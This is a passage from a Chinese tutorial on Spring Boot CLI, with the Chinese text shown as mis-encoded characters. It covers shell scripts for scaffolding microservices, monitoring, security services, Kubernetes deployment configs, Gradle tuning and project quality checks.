    <span class="hljs-string">"user-service:web,data-jpa,config-client,validation"</span>
    <span class="hljs-string">"order-service:web,data-jpa,config-client,feign"</span> 
    <span class="hljs-string">"product-service:web,data-jpa,config-client"</span>
)

<span class="hljs-function"><span class="hljs-title">generate_service</span></span>() {
    <span class="hljs-built_in">local</span> service_name=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> dependencies=<span class="hljs-variable">$2</span>
    
    spring init \
        --build=gradle \
        --java-version=17 \
        --group-id=com.company.microservices \
        --artifact-id=<span class="hljs-string">"<span class="hljs-variable">$service_name</span>"</span> \
        --name=<span class="hljs-string">"<span class="hljs-variable">$service_name</span>"</span> \
        --dependencies=<span class="hljs-string">"<span class="hljs-variable">$dependencies</span>"</span> \
        <span class="hljs-string">"<span class="hljs-variable">$service_name</span>"</span>
}

<span class="hljs-comment"># ç”Ÿæˆæ‰€æœ‰æœåŠ¡</span>
<span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${INFRA_SERVICES[@]}</span>"</span>; <span class="hljs-keyword">do</span>
    IFS=<span class="hljs-string">':'</span> <span class="hljs-built_in">read</span> -r name deps &lt;&lt;&lt; <span class="hljs-string">"<span class="hljs-variable">$service</span>"</span>
    generate_service <span class="hljs-string">"<span class="hljs-variable">$name</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$deps</span>"</span> &amp;
<span class="hljs-keyword">done</span>

<span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${BUSINESS_SERVICES[@]}</span>"</span>; <span class="hljs-keyword">do</span>
    IFS=<span class="hljs-string">':'</span> <span class="hljs-built_in">read</span> -r name deps &lt;&lt;&lt; <span class="hljs-string">"<span class="hljs-variable">$service</span>"</span>  
    generate_service <span class="hljs-string">"<span class="hljs-variable">$name</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$deps</span>"</span> &amp;
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">wait</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"å¾®æœåŠ¡ç”Ÿæ€ç³»ç»Ÿç”Ÿæˆå®Œæˆï¼"</span>
</code></pre>
<h4 data-id="heading-16">3.2 ä¼ä¸šçº§å¼€å‘å·¥ä½œæµ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant D as å¼€å‘è€…
    participant C as Spring Boot CLI
    participant S as Spring Initializr
    participant G as Git
    participant CI as CI/CDæµæ°´çº¿

    D-&gt;&gt;C: spring init é¡¹ç›®
    C-&gt;&gt;S: è¯·æ±‚é¡¹ç›®æ¨¡æ¿
    S-&gt;&gt;C: è¿”å›é¡¹ç›®ç»“æ„
    C-&gt;&gt;D: ç”Ÿæˆé¡¹ç›®æ–‡ä»¶
    D-&gt;&gt;G: git init &amp;&amp; æäº¤
    G-&gt;&gt;CI: è§¦å‘è‡ªåŠ¨åŒ–æµç¨‹
    CI-&gt;&gt;CI: ä»£ç è´¨é‡æ£€æŸ¥
    CI-&gt;&gt;CI: å®‰å…¨åˆè§„æ‰«æ
    CI-&gt;&gt;CI: è‡ªåŠ¨åŒ–æµ‹è¯•
    CI-&gt;&gt;CI: æ„å»ºå’Œéƒ¨ç½²
    CI-&gt;&gt;D: åé¦ˆæ„å»ºç»“æœ
</code></pre>
<h4 data-id="heading-17">3.3 ä¾èµ–ç®¡ç†ç­–ç•¥</h4>
<p><strong>ä¼ä¸šçº§ä¾èµ–çŸ©é˜µï¼š</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># enterprise-dependencies.yaml</span>
<span class="hljs-attr">profiles:</span>
  <span class="hljs-attr">foundation:</span>
    <span class="hljs-attr">base:</span> <span class="hljs-string">"web,devtools,configuration-processor"</span>
    <span class="hljs-attr">monitoring:</span> <span class="hljs-string">"actuator,metrics,prometheus"</span>
    
  <span class="hljs-attr">persistence:</span>
    <span class="hljs-attr">rdbms:</span> <span class="hljs-string">"data-jpa,h2,mysql"</span>
    <span class="hljs-attr">nosql:</span> <span class="hljs-string">"data-mongodb,data-redis"</span>
    
  <span class="hljs-attr">communication:</span>
    <span class="hljs-attr">rest:</span> <span class="hljs-string">"web,webflux,restdocs"</span>
    <span class="hljs-attr">messaging:</span> <span class="hljs-string">"amqp,kafka"</span>
    
  <span class="hljs-attr">security:</span>
    <span class="hljs-attr">basic:</span> <span class="hljs-string">"security"</span>
    <span class="hljs-attr">oauth2:</span> <span class="hljs-string">"oauth2-client,oauth2-resource-server"</span>
</code></pre>
<h3 data-id="heading-18">å››ã€ç›‘æ§ä¸å¯è§‚æµ‹æ€§</h3>
<h4 data-id="heading-19">4.1 å®Œæ•´çš„ç›‘æ§æ ˆ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># monitoring-stack-setup.sh</span>

<span class="hljs-comment"># ç›‘æ§åŸºç¡€è®¾æ–½</span>
spring init --dependencies=actuator,prometheus,micrometer-registry-prometheus \
            --name=<span class="hljs-string">"monitoring-server"</span> \
            monitoring-server

<span class="hljs-comment"># åˆ†å¸ƒå¼è¿½è¸ª</span>
spring init --dependencies=web,actuator,sleuth,zipkin \
            --name=<span class="hljs-string">"tracing-server"</span> \ 
            tracing-server

<span class="hljs-comment"># ä¸ºä¸šåŠ¡æœåŠ¡æ·»åŠ ç›‘æ§</span>
<span class="hljs-function"><span class="hljs-title">add_monitoring_to_service</span></span>() {
    <span class="hljs-built_in">local</span> service_dir=<span class="hljs-variable">$1</span>
    
    <span class="hljs-comment"># æ·»åŠ ç›‘æ§é…ç½®</span>
    <span class="hljs-built_in">cat</span> &gt; <span class="hljs-string">"<span class="hljs-variable">$service_dir</span>/src/main/resources/application-monitoring.yml"</span> &lt;&lt; <span class="hljs-string">'EOF'</span>
management:
  endpoints:
    web:
      exposure:
        include: <span class="hljs-string">"health,info,metrics,prometheus"</span>
  metrics:
    <span class="hljs-built_in">export</span>:
      prometheus:
        enabled: <span class="hljs-literal">true</span>
EOF
}
</code></pre>
<h4 data-id="heading-20">4.2 å¥åº·æ£€æŸ¥æ¶æ„</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[åº”ç”¨å¯åŠ¨] --&gt; B[å°±ç»ªæ¢é’ˆæ£€æŸ¥]
    B --&gt; C{æ˜¯å¦å°±ç»ª?}
    C --&gt;|æ˜¯| D[æ¥æ”¶æµé‡]
    C --&gt;|å¦| E[ç»§ç»­åˆå§‹åŒ–]
    
    F[è¿è¡ŒæœŸç›‘æ§] --&gt; G[å­˜æ´»æ¢é’ˆæ£€æŸ¥]
    G --&gt; H{æ˜¯å¦å¥åº·?}
    H --&gt;|æ˜¯| F
    H --&gt;|å¦| I[é‡å¯å®ä¾‹]
    
    J[å¤–éƒ¨ç›‘æ§] --&gt; K[Prometheus æŠ“å–]
    K --&gt; L[æŒ‡æ ‡å­˜å‚¨]
    L --&gt; M[Grafana å±•ç¤º]
    L --&gt; N[å‘Šè­¦è§¦å‘]
</code></pre>
<h3 data-id="heading-21">æ€»ç»“ï¼ˆä¸Šç¯‡ï¼‰</h3>
<p>é€šè¿‡ä¸Šç¯‡çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº† Spring Boot CLI çš„æ ¸å¿ƒæ¦‚å¿µå’Œåœ¨ä¼ä¸šç¯å¢ƒä¸­çš„åŸºç¡€åº”ç”¨ã€‚å…³é”®æ”¶è·åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>ğŸš€ å®‰è£…é…ç½®</strong> - æŒæ¡äº†å¤šå¹³å°å®‰è£…å’ŒéªŒè¯æ–¹æ³•</li>
<li><strong>ğŸ› ï¸ æ ¸å¿ƒå‘½ä»¤</strong> - ç†Ÿç»ƒä½¿ç”¨ initã€shell ç­‰å…³é”®å‘½ä»¤</li>
<li><strong>ğŸ—ï¸ é¡¹ç›®ç”Ÿæˆ</strong> - å­¦ä¼šäº†å•é¡¹ç›®å’Œæ‰¹é‡é¡¹ç›®åˆ›å»º</li>
<li><strong>ğŸ”§ ä¼ä¸šå®è·µ</strong> - äº†è§£äº†å¾®æœåŠ¡ç”Ÿæ€ç³»ç»Ÿçš„æ­å»ºæ–¹æ³•</li>
<li><strong>ğŸ“Š ç›‘æ§è§‚æµ‹</strong> - æŒæ¡äº†åŸºæœ¬çš„ç›‘æ§å’Œå¥åº·æ£€æŸ¥é…ç½®</li>
</ol>
<p>è¿™äº›åŸºç¡€æŠ€èƒ½ä¸ºä¸‹ç¯‡çš„æ¶æ„å¸ˆçº§é«˜çº§ç”¨æ³•æ‰“ä¸‹äº†åšå®åŸºç¡€ã€‚åœ¨ä¸‹ç¯‡ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨å®‰å…¨æ¶æ„ã€éƒ¨ç½²æµæ°´çº¿ã€æ€§èƒ½ä¼˜åŒ–ç­‰é«˜çº§ä¸»é¢˜ï¼Œå¸¦ä½ ä»ä½¿ç”¨è€…è½¬å˜ä¸º Spring Boot CLI ä¸“å®¶ã€‚</p>
<hr/>
<h2 data-id="heading-22">Spring Boot CLI å®Œå…¨æŒ‡å—ï¼ˆä¸‹ç¯‡ï¼‰ï¼šæ¶æ„å¸ˆçº§é«˜çº§å®æˆ˜</h2>
<h3 data-id="heading-23">å‰è¨€</h3>
<p>åœ¨æŒæ¡äº† Spring Boot CLI çš„åŸºç¡€ç”¨æ³•å’Œä¼ä¸šçº§å®è·µåï¼Œæˆ‘ä»¬å°†è¿›å…¥æ›´é«˜é˜¶çš„é¢†åŸŸã€‚ä½œä¸ºæ¶æ„å¸ˆï¼Œæˆ‘ä»¬ä¸ä»…è¦ä¼šä½¿ç”¨å·¥å…·ï¼Œæ›´è¦ç†è§£å¦‚ä½•å°†å·¥å…·èå…¥å®Œæ•´çš„è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸï¼Œå¦‚ä½•è®¾è®¡ç¬¦åˆä¼ä¸šæ ‡å‡†çš„å®‰å…¨æ¶æ„ï¼Œå¦‚ä½•æ„å»ºå¯é çš„éƒ¨ç½²æµæ°´çº¿ï¼Œä»¥åŠå¦‚ä½•æŒç»­ä¼˜åŒ–ç³»ç»Ÿæ€§èƒ½ã€‚</p>
<p>ä¸‹ç¯‡å°†èšç„¦äºæ¶æ„å¸ˆè§†è§’çš„ Spring Boot CLI é«˜çº§ç”¨æ³•ï¼ŒåŒ…æ‹¬å®‰å…¨æ¶æ„è®¾è®¡ã€äº‘åŸç”Ÿé›†æˆã€æ€§èƒ½ä¼˜åŒ–ã€åˆè§„æ€§æ£€æŸ¥ç­‰å…³é”®ä¸»é¢˜ã€‚è®©æˆ‘ä»¬æ·±å…¥æ¢ç´¢ï¼Œå°†å¼€å‘æ•ˆç‡æå‡åˆ°æ–°çš„é«˜åº¦ã€‚</p>
<h3 data-id="heading-24">äº”ã€å®‰å…¨æ¶æ„è®¾è®¡</h3>
<h4 data-id="heading-25">5.1 å¤šå±‚æ¬¡å®‰å…¨é˜²æŠ¤</h4>
<p><strong>å®‰å…¨æœåŠ¡ç”Ÿæˆï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># security-architecture.sh</span>

<span class="hljs-comment"># 1. è®¤è¯æœåŠ¡</span>
spring init --dependencies=web,data-jpa,security,oauth2-authorization-server,jwt \
            --name=<span class="hljs-string">"auth-server"</span> \
            --package-name=com.company.security.auth \
            auth-server

<span class="hljs-comment"># 2. èµ„æºæœåŠ¡æ¨¡æ¿  </span>
spring init --dependencies=web,data-jpa,oauth2-resource-server,validation \
            --name=<span class="hljs-string">"resource-server-template"</span> \
            --package-name=com.company.security.resource \
            resource-server-template

<span class="hljs-comment"># 3. API ç½‘å…³å®‰å…¨</span>
spring init --dependencies=cloud-gateway,oauth2-client,redis,actuator \
            --name=<span class="hljs-string">"secure-gateway"</span> \
            --package-name=com.company.security.gateway \
            secure-gateway
</code></pre>
<h4 data-id="heading-26">5.2 å®‰å…¨åˆè§„æ€§æ£€æŸ¥</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># security-compliance.sh</span>

<span class="hljs-function"><span class="hljs-title">check_security_compliance</span></span>() {
    <span class="hljs-built_in">local</span> project_dir=<span class="hljs-variable">$1</span>
    
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"æ£€æŸ¥å®‰å…¨åˆè§„æ€§: <span class="hljs-variable">$project_dir</span>"</span>
    
    <span class="hljs-built_in">local</span> score=0
    <span class="hljs-built_in">local</span> total=8
    
    <span class="hljs-comment"># æ£€æŸ¥å®‰å…¨ä¾èµ–</span>
    <span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"spring-boot-starter-security"</span> <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/build.gradle"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ… åŒ…å«å®‰å…¨ä¾èµ–"</span>
        ((score++))
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># æ£€æŸ¥SSLé…ç½®</span>
    <span class="hljs-keyword">if</span> find <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>"</span> -name <span class="hljs-string">"*.yml"</span> | xargs grep -q <span class="hljs-string">"server.ssl"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ… SSL/TLS é…ç½®å­˜åœ¨"</span>
        ((score++))
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># è®¡ç®—åˆè§„åˆ†æ•°</span>
    <span class="hljs-built_in">local</span> compliance_rate=$((score * <span class="hljs-number">100</span> / total))
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å®‰å…¨åˆè§„ç‡: <span class="hljs-variable">$compliance_rate</span>% (<span class="hljs-variable">$score</span>/<span class="hljs-variable">$total</span>)"</span>
    
    <span class="hljs-built_in">return</span> $((compliance_rate &gt;= <span class="hljs-number">80</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>))
}
</code></pre>
<h4 data-id="heading-27">5.3 å®‰å…¨æ¶æ„æµç¨‹å›¾</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[å®¢æˆ·ç«¯è¯·æ±‚] --&gt; B[API Gateway]
    B --&gt; C{è®¤è¯æ£€æŸ¥}
    C --&gt;|æœªè®¤è¯| D[é‡å®šå‘åˆ° Auth Server]
    C --&gt;|å·²è®¤è¯| E[è·¯ç”±åˆ°ä¸šåŠ¡æœåŠ¡]
    
    D --&gt; F[ç”¨æˆ·ç™»å½•]
    F --&gt; G[é¢å‘Token]
    G --&gt; B
    
    E --&gt; H[ä¸šåŠ¡æœåŠ¡]
    H --&gt; I[èµ„æºæœåŠ¡å™¨éªŒè¯Token]
    I --&gt; J[è®¿é—®æ•°æ®åº“]
    
    K[ç›‘æ§ç³»ç»Ÿ] --&gt; L[å®‰å…¨äº‹ä»¶æ”¶é›†]
    L --&gt; M[å¼‚å¸¸æ£€æµ‹]
    M --&gt; N[è‡ªåŠ¨å“åº”]
</code></pre>
<h3 data-id="heading-28">å…­ã€äº‘åŸç”Ÿä¸å®¹å™¨åŒ–</h3>
<h4 data-id="heading-29">6.1 Kubernetes å°±ç»ªé…ç½®</h4>
<p><strong>æœåŠ¡ç½‘æ ¼é…ç½®ç”Ÿæˆï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># service-mesh-setup.sh</span>

<span class="hljs-function"><span class="hljs-title">generate_service_mesh_config</span></span>() {
    <span class="hljs-built_in">local</span> service_name=<span class="hljs-variable">$1</span>
    
    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$service_name</span>/src/main/resources/META-INF"</span>
    
    <span class="hljs-comment"># ç”Ÿæˆ Kubernetes é…ç½®</span>
    <span class="hljs-built_in">cat</span> &gt; <span class="hljs-string">"<span class="hljs-variable">$service_name</span>/src/main/resources/META-INF/kubernetes.yml"</span> &lt;&lt; <span class="hljs-string">EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: $service_name
spec:
  replicas: 2
  selector:
    matchLabels:
      app: $service_name
  template:
    metadata:
      labels:
        app: $service_name
    spec:
      containers:
      - name: $service_name
        image: company/$service_name:latest
        ports:
        - containerPort: 8080
        resources:
          requests:
            memory: "512Mi"
            cpu: "250m"
          limits:
            memory: "1Gi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /actuator/health/liveness
            port: 8080
EOF</span>
}
</code></pre>
<h4 data-id="heading-30">6.2 å¤šç¯å¢ƒéƒ¨ç½²ç­–ç•¥</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># deployment-pipeline.sh</span>

<span class="hljs-function"><span class="hljs-title">generate_deployment_config</span></span>() {
    <span class="hljs-built_in">local</span> service_name=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> environment=<span class="hljs-variable">$2</span>
    
    <span class="hljs-keyword">case</span> <span class="hljs-variable">$environment</span> <span class="hljs-keyword">in</span>
        <span class="hljs-string">"dev"</span>)
            <span class="hljs-comment"># å¼€å‘ç¯å¢ƒé…ç½®</span>
            ;;
        <span class="hljs-string">"prod"</span>)
            <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒé…ç½®</span>
            ;;
    <span class="hljs-keyword">esac</span>
}

<span class="hljs-comment"># ä¸ºæ‰€æœ‰æœåŠ¡ç”Ÿæˆå¤šç¯å¢ƒé…ç½®</span>
SERVICES=(<span class="hljs-string">"user-service"</span> <span class="hljs-string">"order-service"</span> <span class="hljs-string">"product-service"</span>)
ENVIRONMENTS=(<span class="hljs-string">"dev"</span> <span class="hljs-string">"staging"</span> <span class="hljs-string">"prod"</span>)

<span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${SERVICES[@]}</span>"</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">for</span> <span class="hljs-built_in">env</span> <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${ENVIRONMENTS[@]}</span>"</span>; <span class="hljs-keyword">do</span>
        generate_deployment_config <span class="hljs-string">"<span class="hljs-variable">$service</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$env</span>"</span>
    <span class="hljs-keyword">done</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-31">ä¸ƒã€æ€§èƒ½ä¼˜åŒ–ä¸è°ƒä¼˜</h3>
<h4 data-id="heading-32">7.1 ä¾èµ–ä¼˜åŒ–ç­–ç•¥</h4>
<p><strong>ä¾èµ–åˆ†æè„šæœ¬ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># dependency-optimizer.sh</span>

<span class="hljs-function"><span class="hljs-title">analyze_dependencies</span></span>() {
    <span class="hljs-built_in">local</span> project_dir=<span class="hljs-variable">$1</span>
    
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"åˆ†æé¡¹ç›®ä¾èµ–: <span class="hljs-variable">$project_dir</span>"</span>
    
    <span class="hljs-keyword">if</span> [[ -f <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/build.gradle"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-comment"># æå–ä¾èµ–åˆ—è¡¨</span>
        <span class="hljs-built_in">local</span> dependencies=$(grep <span class="hljs-string">"implementation"</span> <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/build.gradle"</span> | <span class="hljs-built_in">wc</span> -l)
        <span class="hljs-built_in">local</span> test_dependencies=$(grep <span class="hljs-string">"testImplementation"</span> <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/build.gradle"</span> | <span class="hljs-built_in">wc</span> -l)
        
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"å®ç°ä¾èµ–: <span class="hljs-variable">$dependencies</span> ä¸ª"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"æµ‹è¯•ä¾èµ–: <span class="hljs-variable">$test_dependencies</span> ä¸ª"</span>
        
        <span class="hljs-comment"># å»ºè®®ä¼˜åŒ–</span>
        <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$dependencies</span> -gt 15 ]]; <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">echo</span> <span class="hljs-string">"âš ï¸  å»ºè®®: ä¾èµ–æ•°é‡è¾ƒå¤šï¼Œè€ƒè™‘æ¨¡å—åŒ–æ‹†åˆ†"</span>
        <span class="hljs-keyword">fi</span>
        
        <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$test_dependencies</span> -eq 0 ]]; <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">echo</span> <span class="hljs-string">"âŒ è­¦å‘Š: ç¼ºå°‘æµ‹è¯•ä¾èµ–"</span>
        <span class="hljs-keyword">fi</span>
    <span class="hljs-keyword">fi</span>
}
</code></pre>
<h4 data-id="heading-33">7.2 æ„å»ºæ€§èƒ½ä¼˜åŒ–</h4>
<p><strong>Gradle æ„å»ºä¼˜åŒ–é…ç½®ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># build-optimization.sh</span>

<span class="hljs-function"><span class="hljs-title">optimize_gradle_build</span></span>() {
    <span class="hljs-built_in">local</span> project_dir=<span class="hljs-variable">$1</span>
    
    <span class="hljs-built_in">cat</span> &gt; <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/gradle.properties"</span> &lt;&lt; <span class="hljs-string">'EOF'</span>
<span class="hljs-comment"># æ„å»ºæ€§èƒ½ä¼˜åŒ–</span>
org.gradle.parallel=<span class="hljs-literal">true</span>
org.gradle.caching=<span class="hljs-literal">true</span>
org.gradle.daemon=<span class="hljs-literal">true</span>
org.gradle.configureondemand=<span class="hljs-literal">true</span>

<span class="hljs-comment"># JVM é…ç½®</span>
org.gradle.jvmargs=-Xmx4g -XX:MaxMetaspaceSize=1g -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8

<span class="hljs-comment"># ä¾èµ–ä¸‹è½½ä¼˜åŒ–</span>
systemProp.http.proxyHost=proxy.company.com
systemProp.http.proxyPort=8080
EOF

    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ… Gradle æ„å»ºé…ç½®å·²ä¼˜åŒ–"</span>
}
</code></pre>
<h4 data-id="heading-34">7.3 åº”ç”¨æ€§èƒ½ç›‘æ§</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[åº”ç”¨æ€§èƒ½] --&gt; B[JVM æŒ‡æ ‡]
    A --&gt; C[æ•°æ®åº“æŒ‡æ ‡]
    A --&gt; D[HTTP è¯·æ±‚æŒ‡æ ‡]
    
    B --&gt; E[GC æ—¶é—´]
    B --&gt; F[å †å†…å­˜ä½¿ç”¨]
    B --&gt; G[çº¿ç¨‹çŠ¶æ€]
    
    C --&gt; H[æŸ¥è¯¢æ€§èƒ½]
    C --&gt; I[è¿æ¥æ± çŠ¶æ€]
    C --&gt; J[é”ç­‰å¾…æ—¶é—´]
    
    D --&gt; K[å“åº”æ—¶é—´]
    D --&gt; L[è¯·æ±‚ç‡]
    D --&gt; M[é”™è¯¯ç‡]
    
    E --&gt; N[æ€§èƒ½ä»ªè¡¨æ¿]
    F --&gt; N
    G --&gt; N
    H --&gt; N
    I --&gt; N
    J --&gt; N
    K --&gt; N
    L --&gt; N
    M --&gt; N
    
    N --&gt; O[è‡ªåŠ¨å‘Šè­¦]
    N --&gt; P[å®¹é‡è§„åˆ’]
</code></pre>
<h3 data-id="heading-35">å…«ã€é«˜çº§å®šåˆ¶ä¸æ‰©å±•</h3>
<h4 data-id="heading-36">8.1 è‡ªå®šä¹‰ Initializr æœåŠ¡</h4>
<p><strong>ä¼ä¸šå®šåˆ¶åŒ–é…ç½®ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># custom-initializr-setup.sh</span>

<span class="hljs-comment"># ä½¿ç”¨ä¼ä¸šå†…éƒ¨ Initializr æœåŠ¡</span>
spring init --target=http://internal-start.company.com \
            --dependencies=web,data-jpa,company-security \
            --<span class="hljs-built_in">type</span>=company-microservice \
            internal-project

<span class="hljs-comment"># è‡ªå®šä¹‰é¡¹ç›®ç±»å‹</span>
spring init --<span class="hljs-built_in">type</span>=company-microservice \
            --dependencies=web,data-jpa,config-client \
            custom-service
</code></pre>
<h4 data-id="heading-37">8.2 CLI æ’ä»¶å¼€å‘</h4>
<p><strong>è‡ªå®šä¹‰å‘½ä»¤ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰ Spring Boot CLI å‘½ä»¤</span>
<span class="hljs-meta">@Order(0)</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompanyInitCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(ApplicationContext context)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å®ç°è‡ªå®šä¹‰é¡¹ç›®åˆå§‹åŒ–é€»è¾‘</span>
        System.out.println(<span class="hljs-string">"å…¬å¸å®šåˆ¶åŒ–é¡¹ç›®åˆå§‹åŒ–..."</span>);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"company-init"</span>;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Initialize company standard project"</span>;
    }
}
</code></pre>
<h3 data-id="heading-38">ä¹ã€æ¶æ„è´¨é‡ä¸è§„èŒƒ</h3>
<h4 data-id="heading-39">9.1 æ¶æ„è´¨é‡è¯„ä¼°</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># architecture-quality-assessment.sh</span>

<span class="hljs-function"><span class="hljs-title">assess_architecture_quality</span></span>() {
    <span class="hljs-built_in">local</span> project_dir=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> project_name=<span class="hljs-variable">$2</span>
    
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"è¯„ä¼°æ¶æ„è´¨é‡: <span class="hljs-variable">$project_name</span>"</span>
    
    <span class="hljs-built_in">local</span> metrics=()
    
    <span class="hljs-comment"># ä¾èµ–æ•°é‡è¯„ä¼°</span>
    <span class="hljs-built_in">local</span> dep_count=$(grep -c <span class="hljs-string">"implementation"</span> <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/build.gradle"</span>)
    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$dep_count</span> -le 10 ]]; <span class="hljs-keyword">then</span>
        metrics+=(<span class="hljs-string">"âœ… ä¾èµ–æ•°é‡åˆç†: <span class="hljs-variable">$dep_count</span>"</span>)
    <span class="hljs-keyword">else</span>
        metrics+=(<span class="hljs-string">"âš ï¸  ä¾èµ–æ•°é‡è¾ƒå¤š: <span class="hljs-variable">$dep_count</span>"</span>) 
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># é…ç½®å¤æ‚åº¦è¯„ä¼°</span>
    <span class="hljs-built_in">local</span> config_files=$(find <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/src/main/resources"</span> -name <span class="hljs-string">"*.yml"</span> | <span class="hljs-built_in">wc</span> -l)
    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$config_files</span> -le 3 ]]; <span class="hljs-keyword">then</span>
        metrics+=(<span class="hljs-string">"âœ… é…ç½®å¤æ‚åº¦ä½"</span>)
    <span class="hljs-keyword">else</span>
        metrics+=(<span class="hljs-string">"âš ï¸  é…ç½®å¤æ‚åº¦ä¸­: <span class="hljs-variable">$config_files</span> ä¸ªæ–‡ä»¶"</span>)
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># è¾“å‡ºè¯„ä¼°ç»“æœ</span>
    <span class="hljs-keyword">for</span> metric <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${metrics[@]}</span>"</span>; <span class="hljs-keyword">do</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$metric</span>"</span>
    <span class="hljs-keyword">done</span>
}
</code></pre>
<h4 data-id="heading-40">9.2 ä»£ç è§„èŒƒæ£€æŸ¥</h4>
<p><strong>è‡ªåŠ¨åŒ–ä»£ç è´¨é‡æ£€æŸ¥ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># code-quality-check.sh</span>

<span class="hljs-function"><span class="hljs-title">check_code_quality</span></span>() {
    <span class="hljs-built_in">local</span> project_dir=<span class="hljs-variable">$1</span>
    
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"æ£€æŸ¥ä»£ç è´¨é‡: <span class="hljs-variable">$project_dir</span>"</span>
    
